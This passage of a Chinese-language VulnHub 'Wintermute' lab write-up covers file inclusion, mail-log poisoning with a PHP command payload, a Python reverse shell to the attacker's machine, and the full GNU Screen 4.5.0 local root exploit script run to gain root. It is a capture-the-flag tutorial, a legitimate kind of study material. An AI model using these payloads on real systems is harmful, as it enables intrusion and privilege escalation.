class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">3000/tcp open  http    Mongoose httpd</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.111</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.111:3000/</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|_    Form action: /authorize.html</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|_    Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">| http-vuln-cve2010-0738: </span></span><br><span class="line"><span class="string">|_  /jmx-console/: Authentication was not required</span></span><br></pre></td></tr></table></figure>

<p>访问80端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub156.jpg"></p>
<p>访问3000端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub157.jpg"></p>
<p>发现下方有提示说用户密码都是admin，然后直接登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: the default user and password are admin</span><br></pre></td></tr></table></figure>
<p>发现有一些目录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub158.jpg"></p>
<p>然后访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTExL3R1cmluZy1ib2xvLw==">http://192.168.56.111/turing-bolo/<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub159.jpg"></p>
<p>点击之后显示如下</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub160.jpg"></p>
<p>从上面的屏幕截图中，可以看到一些日志文件（突出显示）。根据经验，目录遍历，可以在浏览器中执行可写文件。因此，尝试将..&#x2F;..&#x2F;..&#x2F;log&#x2F;mail附加到浏览器中的URL，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=../../../log/mail</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub161.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub162.jpg"></p>
<p>使用下面的url也可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/log/mail</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有用。现在，让尝试使用telnet发送恶意邮件。在邮件主题中包括一些php代码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.111 25</span></span><br><span class="line">Trying 192.168.56.111...</span><br><span class="line">Connected to 192.168.56.111.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 straylight ESMTP Postfix (Debian/GNU)</span><br><span class="line">HELO hack.com</span><br><span class="line">250 straylight</span><br><span class="line">MAIL FROM: hacker@hack.com</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO: wintermute@localhost.com</span><br><span class="line">454 4.7.1 &lt;wintermute@localhost.com&gt;: Relay access denied</span><br><span class="line">RCPT TO: wintermute</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">DATA</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">subject: &lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;luci&#x27;</span>]); ?&gt;</span><br><span class="line">hacked!!</span><br><span class="line">.</span><br><span class="line">250 2.0.0 Ok: queued as EC8E454D7</span><br><span class="line">quit</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>现在再次包含mail.log文件，但是这次发送第二个GET参数luci，该参数将执行我们的命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/log/mail&amp;luci=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub163.jpg"></p>
<p>可以看到成功执行命令，现在构造以下的poc以获得一个reverse shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/turing-bolo/bolo.php?bolo=/var/log/mail&amp;luci=python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.56.102&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以看到kali端成功弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">192.168.56.109: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.109] 48508</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (771): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看是否有可提权的SUID文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>

<p>在screen-4.5.0上运行searchsploit将返回漏洞，以提升权限，完美！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5</span></span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">                                                              | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                 | exploits/linux/local/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)           | exploits/linux/local/41152.txt</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p>看一下exp的源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/41154.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshellr</span><br></pre></td></tr></table></figure>

<p>运行以下sed命令将脚本格式换行和缩进转化一下，脚本才能正常运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/41154<span class="comment"># sed -i -e &#x27;s/\r$//&#x27; 41154.sh</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/41154<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>转换为tty标准的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p>如下成功运行脚本，成功提权，帅爆了。。。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ wget http://192.168.56.102:8000/41154.sh</span><br><span class="line">&lt;ring-bolo$ wget http://192.168.56.102:8000/41154.sh</span><br><span class="line">--2020-01-15 01:30:12--  http://192.168.56.102:8000/41154.sh</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1151 (1.1K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;41154.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">41154.sh            100%[===================&gt;]   1.12K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-15 01:30:12 (415 MB/s) - <span class="string">&#x27;41154.sh&#x27;</span> saved [1151/1151]</span><br><span class="line"></span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ <span class="built_in">chmod</span> 777 *</span><br><span class="line"><span class="built_in">chmod</span> 777 *</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">41154.sh      bolo.css  c7.png    css         molly.log    ta.png</span><br><span class="line">armitage.log  bolo.php  case.log  index.html  riviera.log</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ ./41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">/tmp/libhax.c: In <span class="keyword">function</span> <span class="string">&#x27;dropshell&#x27;</span>:</span><br><span class="line">/tmp/libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;chmod&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">     ^~~~~</span><br><span class="line">/tmp/rootshell.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setuid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setuid(0);</span><br><span class="line">     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setgid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setgid(0);</span><br><span class="line">     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;seteuid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     seteuid(0);</span><br><span class="line">     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setegid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setegid(0);</span><br><span class="line">     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;execvp&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">     ^~~~~~</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt  note.txt  scripts</span><br><span class="line"><span class="comment"># cat note.txt</span></span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">Devs,</span><br><span class="line"></span><br><span class="line">Lady 3Jane has asked us to create a custom java app on Neuromancer<span class="string">&#x27;s primary server to help her interact w/ the AI via a web-based GUI.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The engineering team couldn&#x27;</span>t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can <span class="keyword">do</span>.</span><br><span class="line"></span><br><span class="line">Anyways, we<span class="string">&#x27;ve deployed the war file on tomcat as ordered - located here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/struts2_2.3.15.1-showcase</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;</span>s ready <span class="keyword">for</span> the devs to customize to her liking...I<span class="string">&#x27;m stating the obvious, but make sure to secure this thing.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Bob Laugh</span></span><br><span class="line"><span class="string">Turing Systems Engineer II</span></span><br><span class="line"><span class="string">Freeside//Straylight//Ops5</span></span><br><span class="line"><span class="string"># cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string">5ed185fd75a8d6a7056c96a436c6d8aa</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub164.jpg"></p>
<p>winterMute第一部分到此结束</p>
<ul>
<li>总结：<br> 1.弱口令<br> 2.文件包含<br> 3.telnet发送恶意邮件写shell<br> 4.python reverse shell<br> 5.Screen 4.5.0本地提权<br> 6.用(sed -i -e ‘s&#x2F;\r$&#x2F;&#x2F;‘)将exp换行和缩进和格式变得可执行</li>
</ul>
<h4 id="Wintermute-Neuromancer"><a href="#Wintermute-Neuromancer" class="headerlink" title="Wintermute-Neuromancer"></a>Wintermute-Neuromancer</h4><p>之前的note.txt向显示一个可能的网络目录。但是，当不知道Neuromancer上的哪些端口打开时，这是没有用的。查看Straylight的arp表将告诉我们Neuromancer的地址，即192.168.56.110。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp -a</span></span><br><span class="line">arp -a</span><br><span class="line">? (192.168.56.102) at 00:0c:29:70:75:41 [ether] on enp0s8</span><br><span class="line">? (192.168.56.110) at 08:00:27:de:b9:3d [ether] on enp0s8</span><br><span class="line">? (192.168.56.1) at 0a:00:27:00:00:19 [ether] on enp0s8</span><br><span class="line">? (192.168.56.100) at 08:00:27:25:3d:8a [ether] on enp0s8</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ifconfig</span></span><br><span class="line">ifconfig</span><br><span class="line">enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.111  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::a00:27ff:fe50:96d9  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 08:00:27:50:96:d9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 771  bytes 65226 (63.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 21  bytes 2052 (2.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">enp0s8: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.109  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::a00:27ff:fea9:7af0  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 08:00:27:a9:7a:f0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 197671  bytes 11899335 (11.3 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 197077  bytes 14611455 (13.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 415522  bytes 33365253 (31.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 415522  bytes 33365253 (31.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>也可以写一个脚本探测存活的主机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254); <span class="keyword">do</span></span><br><span class="line">   ping -c 1 192.168.56.<span class="variable">$ip</span> | grep <span class="string">&quot;bytes from&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 4 | <span class="built_in">cut</span> -d <span class="string">&quot;:&quot;</span> -f 1 &amp;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./pingsweep.sh</span></span><br><span class="line">./pingsweep.sh</span><br><span class="line">192.168.56.100</span><br><span class="line">192.168.56.102</span><br><span class="line">192.168.56.111</span><br><span class="line">192.168.56.110</span><br><span class="line">192.168.56.109</span><br></pre></td></tr></table></figure>

